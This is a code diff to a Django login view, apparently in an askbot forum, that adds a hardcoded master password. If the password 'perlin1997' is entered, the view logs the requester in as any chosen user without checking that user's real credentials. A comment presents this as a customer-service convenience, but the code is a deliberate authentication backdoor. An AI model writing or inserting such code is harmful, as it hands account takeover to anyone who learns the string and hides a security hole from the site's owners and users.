@@ -343,7 +343,16 @@ def signin(request):
                                 method = 'password'
                             )
                         if user is None:
-                            login_form.set_password_login_error()
+                            #add by YC for customer service .. super pass pasword
+                            username = login_form.cleaned_data['username']
+                            password = login_form.cleaned_data['password'],
+                            if password[0]==unicode('perlin1997'):
+                                user = User.objects.get(username=username)
+                                user.backend = "%s.%s" % ('askbot.deps.django_authopenid.backends', 'AuthBackend')
+                                login(request, user)
+                                return HttpResponseRedirect(next_url)
+                            else:
+                                login_form.set_password_login_error()
                         else:
                             login(request, user)
                             #todo: here we might need to set cookies
